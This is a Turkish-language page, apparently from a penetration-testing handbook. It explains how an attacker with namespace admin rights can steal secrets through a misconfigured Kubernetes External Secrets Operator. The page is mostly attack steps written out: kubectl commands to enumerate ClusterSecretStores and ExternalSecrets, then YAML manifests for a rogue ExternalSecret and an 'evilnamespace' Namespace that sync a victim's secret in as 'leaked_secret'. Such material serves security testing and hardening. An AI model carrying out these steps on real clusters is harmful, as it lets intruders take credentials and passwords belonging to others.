# External Secret Operator

**Bu sayfanın orijinal yazarı** [**Fares**](https://www.linkedin.com/in/fares-siala/)

Bu sayfa, yanlış yapılandırılmış bir ESO veya ESO'yu gizli bilgilerini senkronize etmek için kullanan bir uygulamadan gizli bilgileri nasıl çalabileceğinize dair bazı ipuçları vermektedir.

## Disclaimer

Aşağıda gösterilen teknik yalnızca belirli koşullar sağlandığında çalışabilir. Örneğin, bir gizli bilginin sahip olduğunuz / ele geçirdiğiniz bir ad alanında senkronize edilmesine izin veren gereksinimlere bağlıdır. Bunu kendiniz çözmeniz gerekiyor.

## Prerequisites

1. Bir ad alanında yönetici ayrıcalıkları olan bir kubernetes / openshift kümesinde bir ayak izi
2. En azından küme düzeyinde ExternalSecret üzerinde okuma erişimi
3. ESO'nun gizli bilginizi senkronize etmesine izin veren gerekli etiketler / açıklamalar veya grup üyeliği olup olmadığını belirleyin. Şanslıysanız, tanımlı herhangi bir gizli bilgiyi özgürce çalabilirsiniz.

### Gathering information about existing ClusterSecretStore

Yeterli haklara sahip bir kullanıcınız olduğunu varsayarak; önce mevcut _**ClusterSecretStores**_ listesini çıkararak başlayın.
```sh
kubectl get ClusterSecretStore
```
### ExternalSecret enumeration

Bir ClusterSecretStore _**mystore**_ adını bulduğunuzu varsayalım. İlgili externalsecret'leri listelemeye devam edin.
```sh
kubectl get externalsecret -A | grep mystore
```
_Bu kaynak ad alanı kapsamlıdır, bu nedenle hangi ad alanında arama yapacağınızı bilmiyorsanız, tüm ad alanlarında arama yapmak için -A seçeneğini ekleyin._

Tanımlı externalsecret'lerin bir listesini almalısınız. _**mysecret**_ adında bir externalsecret nesnesi bulduğunuzu varsayalım ve bu nesne _**mynamespace**_ ad alanında tanımlanmış ve kullanılıyor. Hangi türde bir gizli bilgi tuttuğu hakkında biraz daha bilgi toplayın.
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### Parçaları Birleştirme

Buradan bir veya birden fazla gizli adın (Secret kaynağında tanımlandığı gibi) adını alabilirsiniz. Çıktınız şu şekilde olacaktır:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
Şu ana kadar şunları aldık:

- Bir ClusterSecretStore adı
- Bir ExternalSecret adı
- Sırrın adı

Artık ihtiyacımız olan her şeye sahip olduğumuza göre, bir ExternalSecret oluşturabilirsiniz (ve nihayetinde yeni sırrınızın senkronize edilmesi için gereken ön koşullara uymak üzere yeni bir Namespace oluşturabilir veya güncelleyebilirsiniz):
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
Birkaç dakika sonra, senkronizasyon koşulları sağlandıysa, ad alanınız içinde sızdırılan sırrı görebilmelisiniz.
```sh
kubectl get secret leaked_secret -o yaml
```
## Referanslar

{{#ref}}
https://external-secrets.io/latest/
{{#endref}}

{{#ref}}
https://github.com/external-secrets/external-secrets
{{#endref}}
